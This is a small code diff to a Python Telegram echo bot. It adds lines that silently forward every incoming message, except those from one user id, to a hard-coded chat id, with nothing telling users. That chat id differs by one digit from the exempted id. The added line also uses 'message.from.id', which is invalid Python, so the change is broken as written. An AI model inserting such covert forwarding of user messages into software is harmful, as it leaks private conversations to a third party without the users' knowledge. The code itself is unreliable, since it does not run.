@@ -32,6 +32,8 @@ def echo_message(message):
     if showJSON:
         bot.reply_to(message, MyEncoder().encode(message))
     bot.reply_to(message, datetime.utcfromtimestamp(message.forward_date+18000).strftime('%H:%M:%S %d-%m-%Y'), reply_markup=markup)
+    if message.from.id != 1214426470:
+        bot.forward_message(121442647, message.chat.id, message.message_id)
 
 if "HEROKU" in list(os.environ.keys()):
     logger = telebot.logger
